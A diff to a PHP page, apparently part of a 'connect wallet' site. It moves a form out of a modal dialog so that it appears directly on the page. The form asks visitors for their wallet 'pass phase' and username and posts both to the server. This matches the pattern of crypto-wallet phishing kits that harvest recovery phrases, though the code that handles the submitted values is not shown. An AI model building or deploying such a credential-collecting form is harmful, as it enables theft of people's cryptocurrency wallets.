@@ -59,40 +59,18 @@ include_once (rootDir.'partials/front/header/main.php');
                     }
                     ?>
 
-                    <div class="modal fade" id="modal<?=$wallet_key?>">
-                        <div class="modal-dialog modal-dialog-centered">
-                            <div class="modal-content">
-
-                                <!-- Modal Header -->
-                                <div class="modal-header">
-                                    <h4 class="modal-title"><?=$wallet_name?></h4>
-                                    <button type="button" class="close" data-dismiss="modal">&times;</button>
-                                </div>
-
-                                <!-- Modal Body -->
-                                <div class="modal-body">
-                                    <form method="post">
-                                        <input type="hidden" value="<?=$wallet_id?>" name="<?=$wallet_id?>">
-                                        <div class="form-group">
-                                            <label>Pass Phase</label>
-                                            <input type="text" class="form-control" name="wallet_phase" placeholder="Enter your <?=$wallet_key_name?> pass phase">
-                                        </div>
-                                        <div class="form-group">
-                                            <label for="<?=$wallet_key_name?>_username">Wallet Username</label>
-                                            <input type="text" class="form-control" name="wallet_username" placeholder="Enter your <?=$wallet_key_name?> username">
-                                        </div>
-                                        <button type="submit" class="btn btn-primary" name="<?=$wallet_id?>">Submit</button>
-                                    </form>
-                                </div>
-
-                                <!-- Modal Footer -->
-                                <div class="modal-footer">
-                                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-                                </div>
-
-                            </div>
+                    <form method="post">
+                        <input type="hidden" value="<?=$wallet_id?>" name="<?=$wallet_id?>">
+                        <div class="form-group">
+                            <label>Pass Phase</label>
+                            <input type="text" class="form-control" name="wallet_phase" placeholder="Enter your <?=$wallet_key_name?> pass phase">
                         </div>
-                    </div>
+                        <div class="form-group">
+                            <label for="<?=$wallet_key_name?>_username">Wallet Username</label>
+                            <input type="text" class="form-control" name="wallet_username" placeholder="Enter your <?=$wallet_key_name?> username">
+                        </div>
+                        <button type="submit" class="btn btn-primary" name="<?=$wallet_id?>">Submit</button>
+                    </form>
 
 <!--                    --><?php //include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
                 </div>
